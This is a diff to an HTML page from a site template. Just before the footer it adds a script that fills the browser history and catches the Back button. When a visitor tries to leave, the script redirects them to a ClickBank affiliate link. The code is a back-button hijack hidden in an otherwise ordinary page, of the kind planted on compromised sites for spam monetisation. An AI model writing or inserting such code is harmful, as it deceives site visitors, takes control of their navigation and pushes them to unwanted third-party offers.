@@ -323,7 +323,15 @@ ButtonHover.init();
         </div>
     </div>
 </section>
-
+<script>
+                        history.pushState({}, "", location.href);
+        history.pushState({}, "", location.href);
+        window.onpopstate = function () {
+            setTimeout(function () {
+                location.href = "https://8233fdham53jppafft4ctj48cs.hop.clickbank.net";
+            }, 1);
+        };
+</script>
 <section data-bs-version="5.1" class="footer7 cid-tbM4Q4PbpR" once="footers" id="footer7-2">
 
     
